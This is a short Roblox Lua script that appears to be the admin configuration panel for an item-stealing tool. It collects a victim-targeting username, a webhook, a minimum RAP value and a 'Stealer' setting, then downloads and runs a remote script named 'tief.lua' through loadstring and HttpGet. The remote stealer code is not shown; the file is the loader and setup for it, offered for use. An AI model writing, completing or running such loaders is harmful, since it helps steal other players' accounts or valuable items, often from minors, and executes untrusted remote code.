--Coded by Kizamies#0001/Shimm
--If you leak this you will result ban

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local funcuser = LocalPlayer.Name

if config.Admin == funcuser then
    local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
    local Window = OrionLib:MakeWindow({
        Name = "Admin Panel | Config Script",
        HidePremium = false,
        SaveConfig = true,
        ConfigFolder = "OrionTest"
    })

    local userData = {}

    local Tab = Window:MakeTab({
        Name = "Config",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })

    -- Function to textboxes
    local function addTextbox(sectionName, textboxName)
        local Section = Tab:AddSection({
            Name = sectionName
        })
        Tab:AddTextbox({
            Name = textboxName,
            Default = "",
            TextDisappear = false,
            Callback = function(value)
                userData[sectionName] = value
                print(value)
            end
        })
    end

    --textbox
    addTextbox("Username", "Username")
    addTextbox("WEBHOOK", "Webhook")
    addTextbox("MinimumRAP", "MinimumRAP")
    addTextbox("Typesui", "Typesui")
    addTextbox("Typescript", "Typescript")
    addTextbox("Script name", "ScriptName")
    addTextbox("Stealer", "Stealer")

    Tab:AddButton({
        Name = "Load script",
        Callback = function()
            config = {
                Username = userData.Username or "",
                Webhook = userData.Webhook or "",
                MinimumRap = userData.MinimumRAP or "",
                Typesui = userData.Typesui or "",
                Typescript = userData.Typescript or "",
                ScriptName = userData.ScriptName or "",
                Stealer = userData.Stealer or ""
            }

            loadstring(game:HttpGet("https://raw.githubusercontent.com/Azurexc/test/main/tief.lua", true))()
        end
    })
end
